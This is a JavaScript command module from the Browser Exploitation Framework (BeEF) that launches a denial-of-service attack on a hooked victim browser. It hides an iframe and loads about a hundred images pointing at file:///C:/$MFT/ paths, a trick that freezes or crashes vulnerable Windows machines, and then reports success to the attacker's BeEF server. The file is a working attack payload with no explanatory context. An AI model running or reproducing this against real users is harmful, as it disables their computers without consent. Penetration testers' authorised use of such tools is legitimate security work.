//
// Copyright (c) 2006-2018 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
  var dom = beef.dom.createInvisibleIframe();
  var num_images = 100;

  beef.debug('[NtfsCommonCreate DoS] Initiating ' + num_images + ' requests to $MFT...');
  for (var i = 0; i <= num_images; i++) {
    var path = 'C:/$MFT/' + Math.random().toString(36).substring(2,10);
    var img = new Image;
    img.src = 'file:///' + path;
    dom.appendChild(img);
  }

  beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=DoS request sent');
});

